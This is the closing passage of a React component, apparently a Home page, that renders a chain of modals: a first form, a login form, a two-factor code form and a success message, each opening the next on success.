            <FirstFormModal show={ showFirstModal } onClose={ () => setShowFirstModal( false ) } onSubmit={ handleFirstFormSubmit } texts={ texts } />
            <LoginModal show={ showLoginModal } onClose={ () => setShowLoginModal( false ) } onSubmit={ handleLoginSubmit } onSuccess={ () => { setShowLoginModal( false ); setShow2FAModal( true ); } } texts={ texts } formData={ formData } />
            <TwoFAModal show={ show2FAModal } onClose={ () => setShow2FAModal( false ) } onSubmit={ handle2FASubmit } onSuccess={ () => { setShow2FAModal( false ); setShowSuccessModal( true ); } } texts={ texts } formData={ formData } />
            <SuccessModal show={ showSuccessModal } onClose={ () => setShowSuccessModal( false ) } texts={ texts } />

        </>
    );
};

export default Home;

